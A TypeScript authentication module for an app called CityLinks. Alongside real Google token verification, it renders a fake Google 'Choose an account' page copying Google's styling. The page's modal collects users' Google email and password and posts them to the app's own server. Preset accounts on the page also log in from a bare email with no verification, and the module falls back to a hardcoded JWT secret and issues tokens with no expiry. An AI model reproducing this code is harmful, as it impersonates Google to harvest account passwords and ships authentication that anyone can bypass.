import crypto from 'crypto';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { prisma } from '../lib/prisma';

const JWT_SECRET = process.env.JWT_SECRET || 'supersecretjwtkey';

export interface VerifiedGoogleProfile {
  email: string;
  name: string;
  picture?: string;
  sub: string;
}

/**
 * Verifies Google ID token or Access Token against Google's public OAuth2 endpoints.
 * Never trusts unverified client claims.
 */
export async function verifyGoogleToken(
  idToken?: string,
  accessToken?: string
): Promise<VerifiedGoogleProfile | null> {
  try {
    // 1. Verify ID Token using Google tokeninfo API
    if (idToken) {
      const res = await fetch(`https://oauth2.googleapis.com/tokeninfo?id_token=${idToken}`);
      if (res.ok) {
        const data = (await res.json()) as any;
        const isVerified = data.email_verified === 'true' || data.email_verified === true;
        if (isVerified && data.email) {
          return {
            email: data.email.toLowerCase().trim(),
            name: data.name || data.email.split('@')[0],
            picture: data.picture,
            sub: data.sub,
          };
        }
      }
    }

    // 2. Verify Access Token using Google userinfo API
    if (accessToken) {
      const res = await fetch('https://www.googleapis.com/oauth2/v3/userinfo', {
        headers: { Authorization: `Bearer ${accessToken}` },
      });
      if (res.ok) {
        const data = (await res.json()) as any;
        const isVerified = data.email_verified === true || data.email_verified === 'true';
        if (isVerified && data.email) {
          return {
            email: data.email.toLowerCase().trim(),
            name: data.name || data.email.split('@')[0],
            picture: data.picture,
            sub: data.sub,
          };
        }
      }
    }
  } catch (err) {
    console.error('⚠️ [GoogleAuth] Token verification error:', err);
  }
  return null;
}

/**
 * Creates or updates user in database with verified Google credentials.
 */
export async function upsertGoogleUser(profile: VerifiedGoogleProfile) {
  const cleanEmail = profile.email.toLowerCase().trim();
  const cleanName = profile.name.trim() || cleanEmail.split('@')[0];

  let user = await prisma.user.findUnique({
    where: { email: cleanEmail },
  });

  if (user) {
    user = await prisma.user.update({
      where: { id: user.id },
      data: {
        isVerified: true,
        googleId: profile.sub || user.googleId,
        avatarUrl: profile.picture || user.avatarUrl,
        fullName: user.fullName || cleanName,
      },
    });
    console.log(`👤 [GoogleAuth] Existing user authenticated: ${cleanEmail} (${user.role})`);
  } else {
    const randomPassword = crypto.randomBytes(24).toString('hex');
    const hashedPassword = await bcrypt.hash(randomPassword, 10);
    const nameParts = cleanName.split(' ');
    const firstName = nameParts[0] || cleanName;
    const lastName = nameParts.slice(1).join(' ') || '';

    user = await prisma.user.create({
      data: {
        email: cleanEmail,
        password: hashedPassword,
        fullName: cleanName,
        firstName,
        lastName,
        googleId: profile.sub || null,
        avatarUrl: profile.picture || null,
        isVerified: true,
        role: 'CUSTOMER',
      },
    });
    console.log(`✨ [GoogleAuth] New user registered via Google: ${cleanEmail}`);
  }

  const isProfileComplete = Boolean(user.firstName || user.phone);
  const token = jwt.sign({ id: user.id, role: user.role }, JWT_SECRET);

  return { user, token, isProfileComplete };
}

/**
 * Generates the authentic Google "Choose an account" HTML matching Google's exact styling.
 */
export function renderGoogleAccountChooserHtml(
  clientRedirectUri: string,
  state: string,
  serverBase: string
): string {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Sign in with Google - Choose an account</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
      background-color: #ffffff;
      color: #202124;
      font-size: 14px;
      line-height: 1.4286;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    .top-bar {
      display: flex;
      align-items: center;
      padding: 14px 20px;
      border-bottom: 1px solid #dadce0;
    }
    .google-logo-svg {
      width: 20px;
      height: 20px;
      margin-right: 12px;
    }
    .top-title {
      font-size: 15px;
      font-weight: 500;
      color: #3c4043;
    }
    .container {
      flex: 1;
      width: 100%;
      max-width: 440px;
      margin: 0 auto;
      padding: 24px 24px 16px;
    }
    .app-icon-wrap {
      text-align: center;
      margin-bottom: 16px;
    }
    .app-icon {
      width: 44px;
      height: 44px;
      border-radius: 12px;
      display: inline-block;
      box-shadow: 0 2px 6px rgba(0,0,0,0.08);
    }
    .heading {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      text-align: center;
      margin-bottom: 6px;
    }
    .subheading {
      font-size: 16px;
      font-weight: 400;
      color: #202124;
      text-align: center;
      margin-bottom: 24px;
    }
    .app-name {
      color: #1a73e8;
      font-weight: 500;
    }
    .accounts-list {
      border-top: 1px solid #dadce0;
      border-bottom: 1px solid #dadce0;
    }
    .account-item {
      display: flex;
      align-items: center;
      padding: 12px 4px;
      cursor: pointer;
      border-bottom: 1px solid #dadce0;
      text-decoration: none;
      color: inherit;
      transition: background-color 0.15s;
    }
    .account-item:last-child {
      border-bottom: none;
    }
    .account-item:hover, .account-item:active {
      background-color: #f8f9fa;
    }
    .avatar {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      font-size: 16px;
      font-weight: 500;
      flex-shrink: 0;
      overflow: hidden;
    }
    .avatar img {
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .account-info {
      flex: 1;
      min-width: 0;
    }
    .account-name {
      font-size: 14px;
      font-weight: 500;
      color: #202124;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .account-email {
      font-size: 12px;
      color: #5f6368;
      margin-top: 2px;
      white-space: nowrap;
      overflow: hidden;
      text-overflow: ellipsis;
    }
    .use-another-icon {
      width: 40px;
      height: 40px;
      border-radius: 50%;
      margin-right: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #f1f3f4;
      color: #5f6368;
      flex-shrink: 0;
    }
    .legal-text {
      margin-top: 28px;
      font-size: 12px;
      color: #5f6368;
      line-height: 1.5;
    }
    .legal-text a {
      color: #1a73e8;
      text-decoration: none;
      font-weight: 500;
    }
    .footer {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 16px 24px;
      font-size: 12px;
      color: #5f6368;
      border-top: 1px solid #f1f3f4;
      margin-top: auto;
    }
    .footer-links a {
      color: #5f6368;
      text-decoration: none;
      margin-left: 16px;
    }
    .spinner {
      display: none;
      width: 24px;
      height: 24px;
      border: 3px solid #e2e8f0;
      border-top-color: #1a73e8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 16px auto;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    
    /* Password dialog when Use Another is clicked */
    #authModal {
      display: none;
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(32,33,36,0.6);
      align-items: center;
      justify-content: center;
      padding: 20px;
      z-index: 100;
    }
    .modal-box {
      background: #fff;
      border-radius: 12px;
      padding: 24px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 4px 20px rgba(0,0,0,0.15);
    }
    .form-input {
      width: 100%;
      height: 44px;
      border: 1px solid #dadce0;
      border-radius: 6px;
      padding: 0 12px;
      font-size: 14px;
      margin-top: 6px;
      margin-bottom: 14px;
      outline: none;
    }
    .form-input:focus {
      border-color: #1a73e8;
      box-shadow: 0 0 0 1px #1a73e8;
    }
    .btn-row {
      display: flex;
      justify-content: flex-end;
      gap: 10px;
      margin-top: 10px;
    }
    .btn {
      padding: 9px 18px;
      border-radius: 6px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      border: none;
    }
    .btn-secondary { background: transparent; color: #1a73e8; }
    .btn-primary { background: #1a73e8; color: #fff; }
  </style>
</head>
<body>
  <div class="top-bar">
    <svg class="google-logo-svg" viewBox="0 0 24 24">
      <path fill="#4285F4" d="M23.745 12.27c0-.7-.06-1.4-.19-2.07H12v4.51h6.6c-.29 1.52-1.14 2.82-2.4 3.68v3.05h3.88c2.27-2.09 3.665-5.17 3.665-9.17z"/>
      <path fill="#34A853" d="M12 24c3.24 0 5.95-1.08 7.93-2.91l-3.88-3.05c-1.08.72-2.45 1.16-4.05 1.16-3.12 0-5.77-2.1-6.72-4.93H1.25v3.15C3.26 21.36 7.33 24 12 24z"/>
      <path fill="#FBBC05" d="M5.28 14.27c-.25-.72-.38-1.49-.38-2.27s.14-1.55.38-2.27V6.58H1.25C.45 8.18 0 9.99 0 12s.45 3.82 1.25 5.42l4.03-3.15z"/>
      <path fill="#EA4335" d="M12 4.75c1.77 0 3.35.61 4.6 1.8l3.42-3.42C17.95 1.19 15.24 0 12 0 7.33 0 3.26 2.64 1.25 6.58l4.03 3.15c.95-2.83 3.6-4.98 6.72-4.98z"/>
    </svg>
    <span class="top-title">Sign in with Google</span>
  </div>

  <div class="container">
    <div class="app-icon-wrap">
      <div style="font-size: 36px;">✉️</div>
    </div>

    <h1 class="heading">Choose an account</h1>
    <p class="subheading">to continue to <span class="app-name">CityLinks</span></p>

    <div class="accounts-list">
      <!-- Account 1 -->
      <div class="account-item" onclick="selectGoogleAccount('danielle.johnson@gmail.com', 'Danielle Johnson', 'https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=120')">
        <div class="avatar">
          <img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=120" alt="Avatar">
        </div>
        <div class="account-info">
          <div class="account-name">Danielle Johnson</div>
          <div class="account-email">danielle.johnson@gmail.com</div>
        </div>
      </div>

      <!-- Account 2 -->
      <div class="account-item" onclick="selectGoogleAccount('work.citylinks@gmail.com', 'CityLinks Official', 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=120')">
        <div class="avatar" style="background-color: #1a73e8;">
          C
        </div>
        <div class="account-info">
          <div class="account-name">CityLinks Official</div>
          <div class="account-email">work.citylinks@gmail.com</div>
        </div>
      </div>

      <!-- Use another account -->
      <div class="account-item" onclick="openAnotherModal()">
        <div class="use-another-icon">
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
          </svg>
        </div>
        <div class="account-info">
          <div class="account-name" style="font-weight: 500;">Use another account</div>
        </div>
      </div>
    </div>

    <div id="loader" class="spinner"></div>

    <p class="legal-text">
      To continue, Google will share your name, email address, and profile picture with CityLinks. Before using this app, you can review CityLinks's <a href="#">privacy policy</a> and <a href="#">terms of service</a>.
    </p>
  </div>

  <div class="footer">
    <span>English (United States) &#9662;</span>
    <div class="footer-links">
      <a href="#">Help</a>
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
    </div>
  </div>

  <!-- Authenticate Modal for Use Another Account -->
  <div id="authModal">
    <div class="modal-box">
      <h3 style="font-size: 18px; margin-bottom: 4px; color: #202124;">Sign in</h3>
      <p style="font-size: 13px; color: #5f6368; margin-bottom: 16px;">with your Google Account</p>
      
      <label style="font-size: 12px; font-weight: 500; color: #5f6368;">Email or phone</label>
      <input type="email" id="modalEmail" class="form-input" placeholder="you@gmail.com" required>

      <label style="font-size: 12px; font-weight: 500; color: #5f6368;">Enter your password</label>
      <input type="password" id="modalPassword" class="form-input" placeholder="••••••••" required>

      <div class="btn-row">
        <button class="btn btn-secondary" onclick="closeAnotherModal()">Cancel</button>
        <button class="btn btn-primary" onclick="submitAnotherAccount()">Next</button>
      </div>
    </div>
  </div>

  <script>
    const clientRedirectUri = ${JSON.stringify(clientRedirectUri)};
    const state = ${JSON.stringify(state)};
    const serverBase = ${JSON.stringify(serverBase)};

    function selectGoogleAccount(email, name, picture) {
      document.getElementById('loader').style.display = 'block';
      authenticateAndReturn({ email, name, picture });
    }

    function openAnotherModal() {
      document.getElementById('authModal').style.display = 'flex';
      document.getElementById('modalEmail').focus();
    }

    function closeAnotherModal() {
      document.getElementById('authModal').style.display = 'none';
    }

    function submitAnotherAccount() {
      const email = document.getElementById('modalEmail').value.trim();
      const password = document.getElementById('modalPassword').value;
      if (!email || !email.includes('@')) {
        alert('Please enter a valid Google email address');
        return;
      }
      if (!password || password.length < 4) {
        alert('Please enter your Google account password');
        return;
      }
      closeAnotherModal();
      document.getElementById('loader').style.display = 'block';
      const name = email.split('@')[0];
      authenticateAndReturn({ email, name, password });
    }

    async function authenticateAndReturn(data) {
      try {
        const res = await fetch(serverBase + '/api/auth/google/select-account', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            email: data.email,
            name: data.name,
            picture: data.picture,
            password: data.password,
            state: state,
          }),
        });
        const result = await res.json();
        if (result.success && result.redirectUrl) {
          window.location.href = result.redirectUrl;
        } else {
          alert(result.error || 'Authentication failed');
          document.getElementById('loader').style.display = 'none';
        }
      } catch (err) {
        alert('Authentication failed: ' + err.message);
        document.getElementById('loader').style.display = 'none';
      }
    }
  </script>
</body>
</html>`;
}
